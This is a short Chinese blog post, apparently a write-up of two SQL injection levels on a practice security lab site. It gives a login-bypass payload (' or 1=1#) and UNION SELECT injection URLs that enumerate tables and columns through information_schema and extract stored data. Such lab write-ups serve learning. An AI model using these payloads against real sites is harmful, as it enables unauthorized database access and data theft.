---
layout: post
title: 网络安全实验室--注入关writeup
tag: codes
---

<h2>注入关</h2>

<h6>第一关</h6>

简单的登陆注入绕过。
通过某些敏感字符的测试，如 ' , "...发现只有在用户名栏中输入才会出现mysql的错误。
于是构造：' or 1=1#

<img src="/images/writeup_sql_1.png">

Get Key!

<h6>第二关</h6>

在id里面输入'，返回错误，加上#做注释，同样是错，那么参数应该是intiger，不是string。

先用union select来猜存在几个列。

<code>http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1%20union%20select%201,2,3</code>

试到3的时候返回正确结果。接下来用mysql的information_schema.tables来获取表名，同样的information_schema.columns获取列名。

<code>http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1%20union%20select%201,table_name,3%20from%20information_schema.tables</code>
<code>http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1%20union%20select%201,column_name,3%20from%20information_schema.columns</code>

从中确定表名是:sae_user_sqli3,需要的列名：content，title。

最后：

<code>
http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1%20union%20select%201,title,content%20from%20sae_user_sqli3
</code>

<img src="/images/writeup_sql_2.png">

Get Key!